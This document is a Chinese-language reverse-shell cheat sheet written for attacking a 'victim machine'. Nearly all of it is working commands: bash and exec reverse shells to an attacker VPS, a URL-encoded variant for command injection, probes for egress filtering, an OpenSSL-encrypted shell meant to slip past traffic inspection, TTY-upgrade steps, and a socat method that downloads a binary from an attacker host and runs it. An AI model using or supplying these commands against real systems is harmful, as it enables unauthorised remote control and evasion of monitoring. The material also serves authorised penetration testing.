### 1、检查存在哪些反弹shell的命令
```
受害机上执行：
whereis bash nc python php exec perl ruby telnet

用bash反弹shell：
VPS上执行：nc -n -v -lp 1024
受害机上执行：/bin/bash -i >& /dev/tcp/<your_vps>/1024 0>&1
需要注意，当在URL地址栏或burp中进行命令注入利用时，需执行：
/bin/bash -i %3E%26 /dev/tcp/xx.xx.xx.xx/1024 0%3E%261

用exec反弹shell：
0<&196;exec 196<>/dev/tcp/<your_vps>/1024; sh <&196 >&196 2>&196

其他反弹shell命令可通过浏览器插件Hack-Tools查看
```
### 2、禁止向外流量的检查方法
```
VPS上执行：
tcpdump -i eth0 -n -v icmp|grep -i "length 93"

受害机上执行：
ping -s 65 -c 1 xx.xx.xx.xx
```
### 3、限定向外端口的检查方法
```
VPS上执行：
nc -n -v -lp 3636

受害机上执行：
curl http://xx.xx.xx.xx:3636
```
### 4、流量审查的检查方法
```
第一步，在VPS上生成SSL证书的公钥/私钥对：
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
第二步，VPS监听反弹shell：
openssl s_server -quiet -key key.pem -cert cert.pem -port 443
第三步，受害机上用openssl加密反弹shell的流量：
mkfifo /tmp/s;/bin/bash -i < /tmp/s 2>&1|openssl s_client -quiet -connect xx.xx.xx.xx > /tmp/s;rm /tmp/s
此时，VPS上成功获取哑shell
```
### 5、将哑shell变为功能齐全的交互式shell
```
第一步，在哑shell中执行：
python -c 'import pty;pty.spawn("/bin/bash")'
第二步：键入Ctrl-z，回到VPS的命令行中
第三步，在VPS中执行下述命令回到哑shell中：
stty raw -echo
fg
第四步，在哑shell中键入Ctrl-l，并执行：
reset
export SHELL=bash
export TERM=xterm-256color
stty rows 54 columns 104
此时，VPS上的shell为全功能的shell
```
如果拿到的shell执行Ctrl-z会退出会话，可考虑使用socat的方案：
```
攻击机：
socat file:`tty`,raw,echo=0 tcp-listen:4444
受害机：
curl -o /tmp/socat http://192.168.81.160:8000/socat 或者 wget -O /tmp/socat http://192.168.81.160:8000/socat
chmod u+x /tmp/socat
/tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:192.168.81.160:4444
此时拿到的shell可以执行删除、可以选择历史命令、可以执行ctlr-c
```

参考链接：  
https://www.freebuf.com/vuls/211847.html  
https://saucer-man.com/information_security/233.html#cl-1  
